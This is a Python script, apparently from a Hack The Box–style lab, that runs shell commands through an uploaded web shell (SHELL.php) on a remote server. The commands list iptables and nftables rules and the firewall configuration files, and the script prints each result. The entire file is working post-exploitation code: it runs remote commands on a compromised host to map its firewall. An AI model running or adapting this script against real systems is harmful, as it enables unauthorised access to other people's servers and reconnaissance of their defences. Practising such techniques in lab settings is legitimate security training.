import urllib.request, urllib.parse

cmds = [
    "ls -la /etc/iptables/ 2>&1",
    "cat /etc/iptables/rules.v4 2>&1",
    "cat /etc/nftables.conf 2>&1",
    # Check if iptable rules exist in memory via /proc
    "cat /proc/net/ip_tables_matches 2>&1",
    # Try to read the iptables binary
    "which iptables 2>&1",
    "iptables -L INPUT -v -n 2>&1",
    "iptables -L OUTPUT -v -n 2>&1",
    "iptables-save 2>&1 | head -30",
]

for cmd in cmds:
    url = "http://10.129.26.34/files/SHELL.php?" + urllib.parse.urlencode({"c": cmd})
    headers = {"Host": "support_001.enigma.htb"}
    req = urllib.request.Request(url, headers=headers)
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        result = resp.read().decode("utf-8", errors="replace").strip()
        if result and "Permission denied" not in result:
            print(f"=== {cmd[:60]} ===")
            print(result[:2000])
            print()
    except Exception as e:
        pass
